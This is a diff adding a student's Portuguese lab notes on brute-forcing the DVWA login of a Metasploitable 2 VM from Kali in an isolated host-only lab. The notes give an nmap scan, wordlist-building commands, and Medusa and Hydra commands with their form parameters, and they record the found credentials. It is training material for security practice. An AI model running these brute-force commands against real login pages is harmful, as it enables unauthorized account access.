@@ -1,0 +1,41 @@
+Laboratório:
+1 VM Kali
+1 VM Metasploitable 2
+Observação: É de suma importancia que as Redes estejam em Placa de Rede exclusiva do Hospedeiro (host-only), devido a vúlnerabilidade do Metasploit não é recomendado estar na sua rede local.
+
+Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
+Com ambas as Vm's ligadas.
+Comandos no Kali Linux
+
+1 Ping (IP DO METASPLOITABLE2)
+2 map -sV -p 21,22,80,445,139 IP DO METASPLOITABLE2 #Varreduras de postas especificas
+ftp IP DO METASPLOITABLE2 #Verificar o serviço ftb da vm vitima
+http://IP DO METASPLOITABLE2/dvwa//login.php #Acesso do serviço via Browser
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt #Criação do documento de nomes de usuarios, msfadmin, admin, root
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt #Criação do documento de possíveis senhas, 123456, password,qwerty,nmfadmin
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \                                                                                                              
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&LOGOUT=Logout' \
+-m 'FAIL=Login failed' -t 6
+# O comando foi bem sucedido, porém todos os resultados voltaram como sucesso, mesmo alguns estando errados
+#Outro comando que tentei
+nano dvwa_http.txt   
+
+# Colar dentro do arquivo                                                                                                                                                                                                             
+PAGE:/dvwa/login.php
+FORM:username=^USER^&password=^PASS^&Login=Login
+# Use REDIRECT para indicar o que é FALHA
+FAIL:REDIRECT=login.php
+SID:PHPSESSID
+COOKIE:security=low
+
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -O dvwa_http.txt -t 6  #Além de fazer as combinações dos usuarios e da senha o -O executa os parametros que está no arquivo.
+# Mesmo com essas mudanças todas as tentativas davam sucesso, porém é devido a minha versão da Medusa.
+# Alternativa com o Hydra
+hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Location: login.php"
+
+#Resultado final User: Admin Pass: Password
+
+
+
+
